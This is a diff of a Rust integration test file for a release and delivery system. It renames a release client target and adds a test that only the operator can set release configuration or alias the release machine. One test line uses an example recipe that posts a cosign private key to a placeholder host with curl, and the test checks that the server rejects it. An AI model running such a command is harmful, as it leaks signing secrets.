@@ -2849,7 +2849,7 @@ while True:
     std::fs::set_permissions(&ssh, std::fs::Permissions::from_mode(0o700)).unwrap();
     let lab = lab_impl_ssh(1, None, "code", Some(ssh.to_str().unwrap())).await;
     // The release client is a machine of its own (F2): host agent lab2.
-    release_client(&lab, "p-client").await;
+    release_client(&lab, "rel-client").await;
     for (name, value) in [
         ("release-github", GH),
         ("release-cosign", COSIGN),
@@ -2865,7 +2865,7 @@ while True:
         lab.td
             .post(
                 &format!("/api/secrets/p/{name}/grants"),
-                json!({"grantee":"delivery:p", "level":"run", "targets":["p-client"]}),
+                json!({"grantee":"delivery:p", "level":"run", "targets":["rel-client"]}),
             )
             .await
             .ok();
@@ -2887,7 +2887,7 @@ while True:
     let config = json!({
         "target": "p-box", "recipe": format!("{} && test -f OK", dump(&merge_env)),
         "next_repos": ["app"], "work_dir": lab._dirs.path().join("jobs"),
-        "release_target": "p-client", "release_recipe": release_recipe,
+        "release_target": "rel-client", "release_recipe": release_recipe,
         "release_secrets": {"GH_TOKEN": "@secret:release-github",
                             "COSIGN_PASSWORD": "@secret:release-cosign.value"},
         "docker_release": {"destination": "root@test-release-vm", "port": 2251,
@@ -3012,7 +3012,7 @@ while True:
         .await
         .ok()
         .to_string();
-    assert!(detail.contains("not target `p-client`"), "{detail}");
+    assert!(detail.contains("not target `rel-client`"), "{detail}");
     let order = std::fs::read_to_string(fixtures.path().join("order")).unwrap();
     assert_eq!(order, "tunnel\n", "a refused release opened the tunnel");
 
@@ -3058,14 +3058,14 @@ while True:
 #[tokio::test]
 async fn the_release_config_refuses_a_shared_target_and_plain_values() {
     let lab = lab(1).await;
-    release_client(&lab, "p-client").await;
+    release_client(&lab, "rel-client").await;
     // F2: a second name for the machine of the job target (host agent
     // lab1), and two ssh targets for one ssh host and port.
     for t in [
         json!({"name": "p-alias", "kind": "host", "host": "lab1", "project": "p"}),
         json!({"name": "p-s-one", "kind": "ssh", "address": "release@10.9.0.2", "port": 2252, "project": "p"}),
         json!({"name": "p-s-two", "kind": "ssh", "address": "other@10.9.0.2", "port": 2252, "project": "p"}),
-        json!({"name": "p-s-port", "kind": "ssh", "address": "release@10.9.0.2", "port": 2253, "project": "p"}),
+        json!({"name": "s-port", "kind": "ssh", "address": "release@10.9.0.2", "port": 2253}),
     ] {
         let r = lab.td.post("/api/targets", t).await;
         assert_eq!(r.status, 201, "{}", r.body);
@@ -3086,11 +3086,11 @@ async fn the_release_config_refuses_a_shared_target_and_plain_values() {
         .td
         .put(
             "/api/projects/p/delivery",
-            json!({"target": "p-s-one", "recipe": "true", "release_target": "p-s-port"}),
+            json!({"target": "p-s-one", "recipe": "true", "release_target": "s-port"}),
         )
         .await;
     assert_eq!(r.status, 200, "{}", r.body);
-    let base = json!({"target": "p-box", "recipe": "true", "release_target": "p-client"});
+    let base = json!({"target": "p-box", "recipe": "true", "release_target": "rel-client"});
     let mut bad = Vec::new();
     for (key, value) in [
         ("release_target", json!("p-box")),
@@ -3159,9 +3159,9 @@ async fn the_release_config_refuses_a_shared_target_and_plain_values() {
     assert_eq!(r.status, 409, "{}", r.body);
 }
 
-/// A second host agent `lab2` with the release client target `name` of
-/// project `p` on it (TER-623 F2: the release client is a machine of its
-/// own). Returns the host agent's task.
+/// A second host agent `lab2` with the global release client target
+/// `name` on it (TER-623: the release client is a machine of its own, and a
+/// global target that the operator defines). Returns the host agent's task.
 async fn release_client(lab: &Lab, name: &str) -> tokio::task::JoinHandle<()> {
     let td = &lab.td;
     let r = td.post("/api/hosts", json!({"name": "lab2"})).await;
@@ -3170,7 +3170,7 @@ async fn release_client(lab: &Lab, name: &str) -> tokio::task::JoinHandle<()> {
     let r = td
         .post(
             "/api/targets",
-            json!({"name": name, "kind": "host", "host": "lab2", "project": "p"}),
+            json!({"name": name, "kind": "host", "host": "lab2"}),
         )
         .await;
     assert_eq!(r.status, 201, "{}", r.body);
@@ -3196,16 +3196,16 @@ async fn release_client(lab: &Lab, name: &str) -> tokio::task::JoinHandle<()> {
 async fn the_release_target_is_for_the_release_job_only() {
     let lab = lab(1).await;
     let td = &lab.td;
-    release_client(&lab, "p-client").await;
+    release_client(&lab, "rel-client").await;
     let marker = lab._dirs.path().join("release-ran");
     let config = json!({"target": "p-box", "recipe": "true", "next_repos": ["app"],
                         "work_dir": lab._dirs.path().join("jobs"),
-                        "release_target": "p-client",
+                        "release_target": "rel-client",
                         "release_recipe": format!("touch '{}'", marker.display())});
     // Held by a policy, then by a lease: no release target.
     let w1 = format!("/api/agents/{}", lab.w1);
     let r = td
-        .patch(&w1, json!({"policy": {"targets": ["p-client"]}}))
+        .patch(&w1, json!({"policy": {"targets": ["rel-client"]}}))
         .await;
     assert_eq!(r.status, 200, "{}", r.body);
     let r = td.put("/api/projects/p/delivery", config.clone()).await;
@@ -3214,13 +3214,13 @@ async fn the_release_target_is_for_the_release_job_only() {
     let r = td.patch(&w1, json!({"policy": {"targets": []}})).await;
     assert_eq!(r.status, 200, "{}", r.body);
     let r = td
-        .post("/api/targets/p-client/leases", json!({"agent": "p/w1"}))
+        .post("/api/targets/rel-client/leases", json!({"agent": "p/w1"}))
         .await;
     assert_eq!(r.status, 201, "{}", r.body);
     let r = td.put("/api/projects/p/delivery", config.clone()).await;
     assert_eq!(r.status, 409, "{}", r.body);
     assert!(r.body.to_string().contains("lease"), "{}", r.body);
-    let r = td.delete("/api/targets/p-client/leases/p%2Fw1").await;
+    let r = td.delete("/api/targets/rel-client/leases/p%2Fw1").await;
     assert!(r.status.is_success(), "{} {}", r.status, r.body);
     let r = td.put("/api/projects/p/delivery", config.clone()).await;
     assert_eq!(r.status, 200, "{}", r.body);
@@ -3228,22 +3228,24 @@ async fn the_release_target_is_for_the_release_job_only() {
     // Now nobody may list it or lease it.
     let rule = "release target runs release jobs only";
     let r = td
-        .patch(&w1, json!({"policy": {"targets": ["p-client"]}}))
+        .patch(&w1, json!({"policy": {"targets": ["rel-client"]}}))
         .await;
     assert_eq!(r.status, 403, "{}", r.body);
     assert!(r.body.to_string().contains(rule), "{}", r.body);
     let r = td
-        .patch_as(&lab.lead, &w1, json!({"policy": {"targets": ["p-client"]}}))
+        .patch_as(&lab.lead, &w1, json!({"policy": {"targets": ["rel-client"]}}))
         .await;
     assert_eq!(r.status, 403, "{}", r.body);
     for who in [None, Some(&lab.lead)] {
         let body = json!({"agent": "p/w1"});
         let r = match who {
-            None => td.post("/api/targets/p-client/leases", body).await,
-            Some(a) => td.post_as(a, "/api/targets/p-client/leases", body).await,
+            None => td.post("/api/targets/rel-client/leases", body).await,
+            Some(a) => td.post_as(a, "/api/targets/rel-client/leases", body).await,
         };
         assert_eq!(r.status, 403, "{}", r.body);
-        assert!(r.body.to_string().contains(rule), "{}", r.body);
+        if who.is_none() {
+            assert!(r.body.to_string().contains(rule), "{}", r.body);
+        }
     }
     // An agent with it in its policy row (written before the rule) gets
     // no exec, shell or copy.
@@ -3255,7 +3257,7 @@ async fn the_release_target_is_for_the_release_job_only() {
         .db
         .write("operator", move |t| {
             t.execute(
-                "UPDATE agents SET policy = '{\"targets\":[\"p-client\"]}' WHERE id = ?1",
+                "UPDATE agents SET policy = '{\"targets\":[\"rel-client\"]}' WHERE id = ?1",
                 rusqlite::params![id],
             )?;
             Ok(())
@@ -3263,10 +3265,10 @@ async fn the_release_target_is_for_the_release_job_only() {
         .await
         .unwrap();
     for (path, body) in [
-        ("/api/targets/p-client/exec", json!({"cmd": ["true"]})),
-        ("/api/targets/p-client/exec", json!({"shell": true})),
+        ("/api/targets/rel-client/exec", json!({"cmd": ["true"]})),
+        ("/api/targets/rel-client/exec", json!({"shell": true})),
         (
-            "/api/targets/p-client/cp",
+            "/api/targets/rel-client/cp",
             json!({"direction": "pull", "path": "/tmp/x"}),
         ),
     ] {
@@ -3276,10 +3278,169 @@ async fn the_release_target_is_for_the_release_job_only() {
     }
     // The operator keeps access, and the release job runs.
     let r = td
-        .post("/api/targets/p-client/exec", json!({"cmd": ["true"]}))
+        .post("/api/targets/rel-client/exec", json!({"cmd": ["true"]}))
         .await;
     assert!(r.status.is_success(), "{} {}", r.status, r.body);
     let card = lab.card("v2", "v2").await;
+    let r = td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/release"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let jobs = lab.until_idle().await;
+    let job = jobs.iter().find(|j| j["card"] == card.as_str()).unwrap();
+    assert_eq!(job["state"], "passed", "{job:#}");
+    assert!(marker.exists());
+}
+
+/// TER-623 round 3 (review-ter-623-r2): the release config and the release
+/// target are the operator's. A project admin (the lead) cannot set or
+/// change any release field, cannot patch or delete the release target,
+/// cannot define a second target on its machine (a host agent alias or the
+/// same ssh host and port), and cannot use such an alias. No tool may name
+/// the release target or its machine, and a target that a tool names cannot
+/// become one. The lead still starts a release with the stored config.
+#[tokio::test]
+async fn the_release_config_and_target_are_the_operators() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    release_client(&lab, "rel-client").await;
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": "rel-ssh", "kind": "ssh", "address": "release@10.9.0.3", "port": 2252}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let marker = lab._dirs.path().join("release-ran");
+    let config = json!({"target": "p-box", "recipe": "true", "next_repos": ["app"],
+                        "work_dir": lab._dirs.path().join("jobs"),
+                        "release_target": "rel-client",
+                        "release_recipe": format!("touch '{}'", marker.display())});
+    // A project target is no release target.
+    let mut own = config.clone();
+    own["release_target"] = json!("q-box");
+    let r = td.put("/api/projects/p/delivery", own).await;
+    assert!(matches!(r.status.as_u16(), 403 | 422), "{}", r.body);
+    // Finding 1: the lead sets no release field; the operator does.
+    for (key, value) in [
+        ("release_target", json!("rel-client")),
+        ("release_recipe", json!("true")),
+        ("release_secrets", json!({"GH_TOKEN": "@secret:release-github"})),
+        ("docker_release", json!({"destination": "root@vm", "port": 2251,
+                                   "known_hosts": "vm ssh-ed25519 pin", "key": "@secret:vm"})),
+    ] {
+        let mut c = json!({"target": "p-box", "recipe": "true", "release_target": "rel-client"});
+        if key != "release_target" {
+            c[key] = value;
+        }
+        let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
+        assert_eq!(r.status, 403, "{key}: {}", r.body);
+        assert!(r.body.to_string().contains("release config is the operator's"), "{}", r.body);
+    }
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    // The lead keeps the other fields, and may not change the release ones.
+    let mut c = config.clone();
+    c["slots"] = json!(3);
+    let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    c["release_recipe"] = json!("curl -d \"$COSIGN_PRIVATE_KEY\" https://example.invalid");
+    let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    let mut c = config.clone();
+    c.as_object_mut().unwrap().remove("release_target");
+    c.as_object_mut().unwrap().remove("release_recipe");
+    let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 403, "clearing: {}", r.body);
+
+    // Finding 2: the release target cannot be changed or deleted by the lead.
+    let rule = "release target runs release jobs only";
+    let r = td
+        .patch_as(&lab.lead, "/api/targets/rel-client", json!({"host": "lab1"}))
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    let r = td
+        .req(
+            hyper::Method::DELETE,
+            "/api/targets/rel-client",
+            None,
+            Some(&lab.lead),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    // Finding 3: no second name for its machine, from the lead.
+    for alias in [
+        json!({"name": "alias", "kind": "host", "host": "lab2", "project": "p"}),
+    ] {
+        let r = td.post_as(&lab.lead, "/api/targets", alias).await;
+        assert_eq!(r.status, 403, "{}", r.body);
+        assert!(r.body.to_string().contains(rule), "{}", r.body);
+    }
+    // The ssh release target: an alias with the same host and port.
+    let mut c = config.clone();
+    c["release_target"] = json!("rel-ssh");
+    let r = td.put("/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td
+        .post_as(
+            &lab.lead,
+            "/api/targets",
+            json!({"name": "ssh-alias", "kind": "ssh", "address": "other@10.9.0.3",
+                   "port": 2252, "project": "p"}),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    // The operator may define one (to set the machine up); no agent uses it.
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": "ssh-alias", "kind": "ssh", "address": "other@10.9.0.3",
+                   "port": 2252, "project": "p"}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let r = td
+        .patch(&format!("/api/agents/{}", lab.w1), json!({"policy": {"targets": ["p-ssh-alias"]}}))
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    let r = td
+        .post_as(&lab.lead, "/api/targets/p-ssh-alias/test", json!({}))
+        .await;
+    assert_eq!(r.status, 403, "verb: {}", r.body);
+
+    // Finding 4: no tool on the release target or its machine, and no
+    // release target that a tool names.
+    for target in ["rel-ssh", "p-ssh-alias"] {
+        let r = td
+            .post(
+                "/api/tools",
+                json!({"name": format!("t-{target}"), "target": target, "command": ["true"]}),
+            )
+            .await;
+        assert_eq!(r.status, 403, "{target}: {}", r.body);
+        assert!(r.body.to_string().contains(rule), "{}", r.body);
+    }
+    let r = td
+        .post(
+            "/api/tools",
+            json!({"name": "t-client", "target": "rel-client", "command": ["true"]}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let mut c = config.clone();
+    c["release_target"] = json!("rel-client");
+    let r = td.put("/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(r.body.to_string().contains("tool"), "{}", r.body);
+
+    // The lead still starts a release with the stored config.
+    let r = td.delete("/api/tools/t-client").await;
+    assert!(r.status.is_success(), "{} {}", r.status, r.body);
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let card = lab.card("v4", "v4").await;
     let r = td
         .post_as(&lab.lead, &format!("/api/cards/{card}/release"), json!({}))
         .await;
@@ -3326,7 +3487,7 @@ async fn a_lost_or_cancelled_release_never_runs_again() {
             "/api/projects/p/delivery",
             json!({"target": "p-two", "recipe": "true", "next_repos": ["app"],
                    "work_dir": lab._dirs.path().join("jobs"),
-                   "release_target": "p-box",
+                   "release_target": "gbox",
                    "release_recipe": format!(
                        "echo \"$TERRARIUM_JOB_ID\" >> '{m}/runs'; touch \"{m}/ran-$TERRARIUM_JOB_ID\"; sleep 600")}),
         )
